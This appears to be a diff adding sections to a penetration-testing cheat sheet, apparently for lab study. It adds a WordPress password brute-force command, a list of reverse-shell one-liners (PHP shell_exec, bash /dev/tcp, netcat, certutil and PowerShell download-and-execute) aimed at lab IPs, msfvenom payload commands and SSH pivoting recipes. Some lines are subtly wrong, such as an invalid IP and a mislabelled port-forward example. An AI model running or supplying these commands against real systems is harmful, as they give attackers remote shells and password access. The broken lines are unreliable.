@@ -21,6 +21,7 @@ hydra -l bethany -P /usr/share/wordlists/rockyou.txt -s 9505 -f 10.11.1.50 http-
 ##### WP easy
 ```bash
 https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1
+wpscan --usernames admin -P /usr/share/wordlists/rockyou.txt --force --password-attack wp-login --url http://192.168.XXX.XXX
 ```
 ##### VPN Trouble shooting
 ```bash
@@ -284,8 +285,29 @@ if you happen to get unto an ancient windows machine that needs to execute 32 bi
 64-bit (x64) Powershell ISE executable     %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe
 ```
 
+# REVERSE SHELLS
+```bash
+PHP 
+<?php $cmd = shell_exec('bash -i >& /dev/tcp/192.168.119.155/4444 0>&1'); echo $cmd;?> 
+<?php $cmd = shell_exec('cmd /c \\192.168.119.155\test\nc.exe -e cmd.exe 192.168.119.155 4444'); echo $cmd;?> 
+
+LINUX
+bash -i >& /dev/tcp/192.168.119.136/4444 0>&1  
+mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i |nc 192.168.119.155 4444 >/tmp/f2 
+nc -e /bin/bash 192.168.119.1136 4444
+/bin/sh -i 2>&1|nc 192.168.119.136 80
+
+WINDOWS
+certutil -urlcache -f http://192.168.119.136/nc.exe nc.exe & nc.exe -e cmd.exe 192.168.119.155 4444
+certutil -urlcache -f http://192.168.119.155/shell.exe shell.exe & shell.exe
+powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.119.136/Invoke-PowerShellTcp.ps1')"
+powershell -exec bypass -c "iwr('http://192.168.119.136/Invoke-PowerShellTcp.ps1')|iex"
+```
 # MSFVENOM 
 ```bash
+Unstaged
+msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf  
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe 
 
 ```
 
@@ -328,3 +350,33 @@ sudo apt install default-libmysqlclient-dev default-libmysqld-dev
 After you've finished compiling, run "file <compiled file name>". Is the file shown as a 32 bit or 64 bit binary? If it's still 64 bit even after using the -m32 flag you can try "sudo apt install gcc-multilib". Then run gcc -m32 -Wl,--hash-style=both -o outputfile inputfile.c 
 
 ```
+
+# SSH Tunneling
+```bash
+ssh -f -N -R 8000:10.3.3.14:80 -R 4443:10.3.3.14:443 -R 33306:10.3.3.14:3306 -R 33389:10.3.3.14:3389  -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i key kali@192.168.19.57
+# kill with
+ps -C ssh
+kill -9 <pid>
+
+# SSH local port forward to reach  an_internal_server_ip:port via server_ip
+ssh tunneler@server_ip -p 2222 -L 1234:an_internal_server_ip:80 
+# Now curl localhost:1234 will fetch an_internal_server_ip:80 which is reachable from server_ip only
+
+# dynamic port forward to create a SOCKS proxy to visit any_internal_server_ip
+ssh tunneler@server_ip -p 2222 -D 1080 
+# next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from server_ip only
+
+# ProxyJump ssh to an_internal_host via ssh server_ip
+ssh -J tunneler@server_ip:2222 whistler@an_internal_host # which is only accessible from server_ip
+
+# SSH remote port forward to send traffic back to our local port from a port of server_ip
+ssh whistler@server_ip -p 2222 -L 58671:localhost:1234 # 
+# this will listen on port 58671 of server_ip and tunnel the traffic back to us on loclahost:1234; nc -nlvp 1234 to receive for example
+
+# Chain ProxyJump + dynamic port forward to create a proxy of 2nd_box which is only accessible via 1st_box
+ssh -j firstuser@1st_box:2222 seconduser@2nd_box -D 1080
+# next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from 2nd_box only
+
+# bypass first time prompt when have non-interactive shell
+
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" ...
